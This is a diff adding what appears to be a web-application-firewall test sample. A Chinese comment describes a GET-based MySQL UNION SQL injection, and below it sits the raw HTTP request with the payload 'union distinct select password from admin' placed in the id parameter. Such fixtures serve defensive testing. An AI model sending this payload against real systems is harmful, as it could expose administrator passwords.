@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506223
+# 攻击者基于UNION查询，将"union distinct select password from admin"语句注入到 SQL 查询参数中，使用DISTINCT关键字来确保返回的结果集唯一。如果注入攻击成功，查询的结果将包含"admin"表的密码字段的值，这可能会导致管理员密码被泄露，从而对系统的安全造成严重威胁。
+GET /?id=1%20union%20distinct%20select%20password%20from%20admin&bid=hd_tag_m8mv24fk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24fk
+RM-PRO-Token: 72543325f12729dd989fa76b91a176c0
+RM-PRO-Time: 1742808379490
+User-Agent: curl/7.83.1
+
